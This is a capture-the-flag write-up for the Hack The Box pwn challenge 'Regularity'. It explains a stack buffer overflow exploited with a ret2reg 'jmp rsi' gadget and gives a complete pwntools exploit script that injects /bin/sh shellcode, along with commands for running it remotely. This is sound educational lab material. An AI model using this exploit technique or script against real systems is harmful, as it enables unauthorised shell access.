# CTF Writeup: Regularity

## Overview
**Category:** Pwn
**Technique:** Buffer Overflow, `ret2reg` (Return to Register), Shellcode
**Summary:** This challenge presents a classic buffer overflow scenario. While the stack is executable (NX disabled), ASLR prevents us from hardcoding the stack address to execute our shellcode. However, because the binary lacks PIE (Position Independent Executable), we can bypass ASLR by using a `ret2reg` technique, leveraging a `jmp rsi` gadget to jump to our shellcode.

---

## 1. Initial Analysis

Before reverse engineering, analyzing the binary's protections is critical. Running `checksec` on the `regularity` binary reveals the following:

* **Arch:** amd64-64-little
* **NX:** Disabled (Stack is Executable)
* **PIE:** Disabled (Code is loaded at a fixed address, `0x400000`)
* **Stack:** No Canary found

**What this means for us:**
Because NX is disabled, we can place shellcode directly onto the stack and the CPU will execute it. Because there is no Stack Canary, we can overflow the buffer to overwrite the instruction pointer (RIP) without triggering a crash. Because PIE is disabled, the program's code instructions are always located at the exact same memory addresses, even if the system has ASLR enabled.

## 2. The Vulnerability & The ASLR Problem

Through dynamic analysis (using GDB), we discover a buffer overflow vulnerability. We can write past the allocated buffer and control the saved Return Address (RIP) at exactly an offset of 256 bytes. 



The standard approach would be to put our shellcode in the buffer and overwrite the Return Address with the memory address of our buffer. However, the remote server has **ASLR (Address Space Layout Randomization)** enabled. This means the stack is loaded into a different, random memory location every time the program runs. If we hardcode the stack address we found locally, the exploit will fail remotely.

## 3. The Solution: `ret2reg` (Return to Register)

To bypass ASLR without an information leak, we inspect the CPU registers at the exact moment the program crashes (when the vulnerable function returns). 

We notice that the `rsi` register is pointing directly to the beginning of our input buffer. This happens because the `read()` function used `rsi` to keep track of where it was storing our input. 

Instead of guessing the stack address, we can overwrite the Return Address with an instruction that tells the CPU: *"Jump to whatever address is currently stored in the RSI register."*

Because PIE is disabled, we can search the `regularity` binary for a `jmp rsi` instruction. This "gadget" will always be at the same memory address, completely unaffected by ASLR.

## 4. The Exploit Script

Here is the clean exploit script using `pwntools`:

```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'regularity')

context(terminal=['tmux', 'split-window', '-h'])

host = args.HOST or '10.10.10.10'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

io = start()

jmp_rsi = next(exe.search(asm('jmp rsi')))
shellcode = asm(shellcraft.sh())
payload = shellcode + b'A' * (256 - len(shellcode)) + p64(jmp_rsi)

io.send(payload)

io.clean()
io.sendline(b'cat flag.txt')
warning('Flag: ' + io.recv().decode('utf-8'))

io.interactive()
```

## 5. Exploit Breakdown

1.  **Finding the Gadget:** `jmp_rsi = next(exe.search(asm('jmp rsi')))`
    We use pwntools to automatically search the binary's executable memory segments for the opcode bytes that represent `jmp rsi`. It grabs the address of this instruction.
2.  **Generating Shellcode:** `shellcode = asm(shellcraft.sh())`
    We use pwntools' built-in `shellcraft` to generate 64-bit Linux shellcode that executes `/bin/sh`.
3.  **Constructing the Payload:** `payload = shellcode + b'A' * (256 - len(shellcode)) + p64(jmp_rsi)`
    * First, we place our shellcode at the very beginning of the payload (which is where `rsi` will be pointing).
    * Next, we pad the payload with 'A's. We need exactly 256 bytes to reach the Return Address. We subtract the length of our shellcode so the total padding perfectly aligns everything.
    * Finally, we append the fixed address of our `jmp rsi` gadget, packed into a 64-bit format.
4.  **Execution:** We send the payload. The program reads it, overwrites the Return Address, and attempts to return. Instead of returning to `main`, it returns to `jmp rsi`. The `jmp rsi` instruction executes, jumping the execution flow precisely to the start of our buffer where our shellcode is waiting.

## 6. How to Run

**To test locally:**
```bash
python exploit.py
```

**To run against the Hack The Box target:**
```bash
python exploit.py REMOTE HOST=<target_ip> PORT=<target_port>
```

<img width="701" height="332" alt="image" src="https://github.com/user-attachments/assets/526396d7-5ed5-483d-97a9-5a79c1364d8e" />
